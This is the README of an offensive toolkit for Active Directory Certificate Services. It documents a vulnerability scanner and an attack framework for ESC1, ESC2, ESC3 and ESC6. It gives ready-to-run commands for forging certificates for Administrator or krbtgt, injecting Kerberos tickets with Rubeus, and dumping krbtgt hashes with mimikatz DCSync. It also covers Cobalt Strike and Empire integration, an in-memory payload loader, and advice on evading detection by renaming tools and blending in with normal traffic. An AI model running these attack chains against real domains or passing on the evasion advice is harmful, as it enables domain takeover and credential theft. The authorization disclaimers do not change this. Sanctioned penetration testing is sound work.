# ADCS Automation Scripts

Custom PowerShell scripts for automated ADCS vulnerability assessment and exploitation.

## Directory Structure

```
scripts/
├── enumeration/
│   └── Enumerate-ADCS.ps1          # Vulnerability scanner
├── exploitation/
│   └── Invoke-ADCSAttack.ps1       # Attack automation framework
├── defense/
│   └── (Defensive scripts - TBD)
└── post-exploitation/
    └── GruntHTTP.ps1               # In-memory payload execution
```

---

## Enumeration Scripts

### Enumerate-ADCS.ps1

**Purpose**: Automated ADCS vulnerability scanner with comprehensive reporting

**Features**:
- ✅ ESC1 detection (ENROLLEE_SUPPLIES_SUBJECT templates)
- ✅ ESC2 detection (Any Purpose/No EKU templates)
- ✅ ESC3 detection (Enrollment Agent templates)
- ✅ ESC4 detection (Weak template ACLs)
- ✅ ESC6 detection (EDITF_ATTRIBUTESUBJECTALTNAME2 flag)
- ✅ Current user context enumeration
- ✅ HTML report generation
- ✅ Severity classification (Critical/High/Medium/Low)

**Usage**:
```powershell
# Full vulnerability scan
.\Enumerate-ADCS.ps1 -Verbose -OutputFile adcs-assessment.html

# Scan for specific techniques
.\Enumerate-ADCS.ps1 -CheckESC1 -CheckESC4 -Verbose

# Run all checks (default)
.\Enumerate-ADCS.ps1 -AllChecks

# Quick scan without verbosity
.\Enumerate-ADCS.ps1
```

**Output**:
- Console: Color-coded findings (Red=Critical, Yellow=High, Green=Low)
- HTML Report: Executive summary with vulnerability details
- Includes: Template names, permissions, vulnerability conditions

**Requirements**:
- Active Directory PowerShell module
- Domain-joined Windows machine
- Domain user credentials (reads from current context)

**Example Output**:
```
╔═══════════════════════════════════════════════════════════╗
║          ADCS Vulnerability Enumeration Tool             ║
║                    Version 1.0                            ║
╚═══════════════════════════════════════════════════════════╝

[*] Checking for ESC1 vulnerabilities...
[Critical] ESC1 - VulnerableUserTemplate
  Template allows arbitrary SAN with client authentication

[*] Checking for ESC4 vulnerabilities...
[High] ESC4 - ModifiableTemplate
  Current user has write permissions on template

╔═══════════════════════════════════════════════════════════╗
║                    SCAN COMPLETE                          ║
╚═══════════════════════════════════════════════════════════╝

Total Vulnerabilities Found: 5
  Critical: 3
  High: 2

[+] Report generated: adcs-assessment.html
```

---

## Exploitation Scripts

### Invoke-ADCSAttack.ps1

**Purpose**: Automated ADCS attack framework for common exploitation scenarios

**Supported Attacks**:
- ESC1: Misconfigured certificate templates (arbitrary SAN)
- ESC2: Any Purpose EKU exploitation
- ESC3: Enrollment Agent abuse (two-step attack)
- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 exploitation

**Features**:
- Auto-detection of CA infrastructure
- Automatic certificate conversion (PEM → PFX)
- Integrated Rubeus authentication (optional)
- Organized output directory structure
- Error handling and validation

**Usage**:

#### ESC1 Attack
```powershell
# Basic ESC1 exploitation
.\Invoke-ADCSAttack.ps1 `
    -AttackType ESC1 `
    -Template "VulnerableUserTemplate" `
    -Target "Administrator" `
    -CAServer "dc01.corp.local" `
    -CAName "CORP-DC01-CA"

# ESC1 with auto-authentication
.\Invoke-ADCSAttack.ps1 `
    -AttackType ESC1 `
    -Template "VulnerableUserTemplate" `
    -Target "Administrator" `
    -AutoAuthenticate

# Auto-detect CA (requires AD module)
.\Invoke-ADCSAttack.ps1 `
    -AttackType ESC1 `
    -Template "VulnerableUserTemplate" `
    -Target "krbtgt"
```

#### ESC3 Attack (Enrollment Agent)
```powershell
.\Invoke-ADCSAttack.ps1 `
    -AttackType ESC3 `
    -EnrollmentAgentTemplate "EnrollmentAgentTemplate" `
    -Template "UserAuthTemplate" `
    -Target "DomainAdmin" `
    -AutoAuthenticate
```

#### ESC6 Attack
```powershell
# ESC6 works with ANY template due to CA misconfiguration
.\Invoke-ADCSAttack.ps1 `
    -AttackType ESC6 `
    -Template "User" `
    -Target "Administrator"
```

**Parameters**:
- `-AttackType`: ESC1, ESC2, ESC3, or ESC6
- `-Template`: Certificate template name
- `-Target`: Target user for impersonation
- `-CAServer`: CA server DNS name (optional, auto-detected)
- `-CAName`: CA common name (optional, auto-detected)
- `-EnrollmentAgentTemplate`: For ESC3 attacks
- `-AutoAuthenticate`: Automatically run Rubeus authentication
- `-CertifyPath`: Path to Certify.exe (default: .\Certify.exe)
- `-RubeusPath`: Path to Rubeus.exe (default: .\Rubeus.exe)
- `-OutputDir`: Output directory for certificates (default: .\output)

**Workflow**:

1. **Auto-Detection** (if CA not specified):
   - Queries Active Directory for enrollment services
   - Identifies CA server and name

2. **Certificate Request**:
   - Executes Certify.exe with appropriate parameters
   - Extracts certificate and private key from output
   - Saves to PEM format

3. **Conversion**:
   - Converts PEM to PFX using OpenSSL
   - Sets password: "password"
   - Saves to output directory

4. **Authentication** (if `-AutoAuthenticate`):
   - Executes Rubeus.exe asktgt
   - Injects TGT into current session
   - Displays ticket information

**Output Files**:
```
output/
├── Administrator-esc1.pem     # Certificate and private key (PEM)
├── Administrator-esc1.pfx     # Certificate (PFX, password: "password")
├── agent.pem                  # Enrollment agent cert (ESC3)
├── agent.pfx                  # Enrollment agent PFX (ESC3)
└── DomainAdmin-esc3.pfx      # Target certificate (ESC3)
```

**Requirements**:
- Certify.exe in current directory or specified path
- Rubeus.exe (if using -AutoAuthenticate)
- OpenSSL (for PEM to PFX conversion)
- Active Directory PowerShell module (for auto-detection)

**Example Output**:
```
╔════════════════════════════════════════════════════════════╗
║           ADCS Attack Automation Framework                 ║
║                  Version 1.0                               ║
║                                                            ║
║  WARNING: For Authorized Security Testing Only!           ║
╚════════════════════════════════════════════════════════════╝

[!] Attack Type: ESC1
[!] Ensure you have explicit authorization before proceeding!

[*] Auto-detecting Certificate Authority...
[+] Found CA: dc01.corp.local\CORP-DC01-CA

[*] Executing ESC1 Attack
    Template: VulnerableUserTemplate
    Target: Administrator
    CA: dc01.corp.local\CORP-DC01-CA

[*] Step 1: Requesting certificate with arbitrary SAN...
[+] Certificate saved to: .\output\Administrator-esc1.pem

[*] Step 2: Converting to PFX format...
[+] PFX created: .\output\Administrator-esc1.pfx
    Password: password

[*] Step 3: Authenticating with certificate...
[*] Requesting TGT with certificate...
[+] TGT requested and injected!

╔════════════════════════════════════════════════════════════╗
║                 ATTACK EXECUTION COMPLETE                  ║
╚════════════════════════════════════════════════════════════╝

Next Steps:
1. Authenticate with certificate:
   .\Rubeus.exe asktgt /user:Administrator /certificate:.\output\Administrator-esc1.pfx /password:password /ptt

2. Verify access:
   klist
   dir \\dc01.corp.local\C$
```

---

## Post-Exploitation Scripts

### GruntHTTP.ps1

**Purpose**: In-memory .NET assembly execution via reflective loading

**Features**:
- Loads compressed/encoded .NET assemblies
- Executes in memory without touching disk
- OpSec-friendly payload delivery

**Note**: This is a legacy/reference script. For modern operations, consider:
- Cobalt Strike's `execute-assembly`
- PowerShell Empire modules
- Custom C2 frameworks

---

## Defense Scripts (Planned)

Future defensive automation scripts:

### Audit-CertTemplates.ps1
- Regular template security audits
- Compliance checking against baselines
- Email alerting for misconfigurations

### Harden-ADCS.ps1
- Automated template hardening
- ACL remediation
- CA configuration security

### Monitor-CertificateIssuance.ps1
- Real-time certificate issuance monitoring
- Anomaly detection
- Alert generation

---

## Best Practices

### Enumeration
1. **Always enumerate first** - Run Enumerate-ADCS.ps1 before exploitation
2. **Save reports** - Keep HTML reports for documentation and evidence
3. **Understand findings** - Review each vulnerability before exploiting
4. **Non-intrusive** - Enumeration is passive and safe

### Exploitation
1. **Authorization** - Ensure written permission before running attacks
2. **Test in lab** - Validate attacks in lab environment first
3. **Cleanup** - Remove/revoke certificates after testing
4. **Documentation** - Log all exploitation activities
5. **Restore state** - Revert any template modifications (ESC4)

### Operational Security
1. **Avoid detection**:
   - Use obfuscated/renamed tools
   - Minimize disk writes
   - Clean up artifacts

2. **Blend in**:
   - Run during business hours
   - Use legitimate admin accounts when possible
   - Match normal enrollment patterns

3. **Logging**:
   - Be aware of Event IDs 4886, 4887, 4768
   - Expect detection in mature environments
   - Plan for incident response

---

## Troubleshooting

### Common Issues

**Issue**: "Certify.exe not found"
```powershell
# Solution: Specify full path
.\Invoke-ADCSAttack.ps1 -AttackType ESC1 -Template Test -Target Admin -CertifyPath C:\Tools\Certify.exe
```

**Issue**: "OpenSSL not found - certificate conversion failed"
```powershell
# Solution 1: Install OpenSSL
choco install openssl

# Solution 2: Manual conversion (shown in script output)
openssl pkcs12 -in cert.pem -export -out cert.pfx -passout pass:password
```

**Issue**: "Failed to auto-detect CA"
```powershell
# Solution: Manually specify CA
.\Invoke-ADCSAttack.ps1 -AttackType ESC1 -Template Test -Target Admin -CAServer dc.corp.local -CAName CORP-CA
```

**Issue**: "Access denied during enumeration"
```powershell
# Cause: Insufficient permissions to read AD objects
# Solution: Run as domain user with appropriate rights
```

---

## Integration Examples

### With Cobalt Strike
```csharp
# Upload and execute enumeration
beacon> upload C:\Tools\Enumerate-ADCS.ps1
beacon> powershell-import C:\Tools\Enumerate-ADCS.ps1
beacon> powershell Enumerate-ADCS -OutputFile report.html
beacon> download report.html
```

### With Empire
```python
# Load script
(Empire: agents) > usemodule powershell/situational_awareness/network/adcs_enum
(Empire: module) > set Script /path/to/Enumerate-ADCS.ps1
(Empire: module) > execute
```

### Standalone Automation
```powershell
# Full automated attack chain
# 1. Enumerate
.\Enumerate-ADCS.ps1 -OutputFile scan.html

# 2. Review findings, identify ESC1 vulnerability

# 3. Exploit
.\Invoke-ADCSAttack.ps1 -AttackType ESC1 -Template VulnerableTemplate -Target Administrator -AutoAuthenticate

# 4. DCSync (if Domain Admin)
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

---

## References

- [SpecterOps ADCS Research](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certify Documentation](https://github.com/GhostPack/Certify)
- [Rubeus Documentation](https://github.com/GhostPack/Rubeus)

---

**Author**: ADCS Automation Research
**Version**: 1.0
**Last Updated**: November 2025
**License**: Authorized Security Testing Only
